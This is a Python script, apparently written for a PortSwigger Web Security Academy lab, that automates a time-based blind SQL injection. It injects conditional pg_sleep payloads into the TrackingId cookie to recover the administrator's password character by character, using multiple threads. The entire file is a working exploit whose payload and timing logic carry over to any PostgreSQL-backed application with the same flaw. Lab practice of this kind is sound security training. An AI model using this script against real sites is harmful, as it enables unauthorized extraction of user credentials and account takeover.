#!/usr/bin/env python3

import pwn
import requests
import signal
import string
import sys
import time

from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(0)

signal.signal(signal.SIGINT,def_handler)

URL = "https://0a45000c0439509e801f17b100ea00da.web-security-academy.net/"
result = ""
p1 = pwn.log.progress("Iniciando ataque SQLI")
p2 = pwn.log.progress("Resultado")
characters = string.ascii_lowercase + string.digits

def makeSQLI(pos,i):
    global result
    global p1
    global p2
    global error

    raw_injection = "'||(select case when ((select substring(password,%d,1) from users where username='administrator')='%s') then pg_sleep(2.5) else NULL end)-- -" %(pos,i)
    injection = quote(raw_injection)
    p1.status(raw_injection)

    cookies = {
        'TrackingId':'IS9vhEX1rHGoL2T4' + injection,
        'session':'IjWS6nMWD9i1eaM3gWnpNz0aPn2E8XK2'
    }

    start = time.time()
    r = requests.get(url=URL,cookies=cookies)
    end = time.time()
    if end - start > 2.5:
        result += i
        p2.status(result)
        return True
        
    return False

for pos in range(1,21):
    with ThreadPoolExecutor(max_workers=35) as executor:
        executor.map(lambda i: makeSQLI(pos,i),characters)
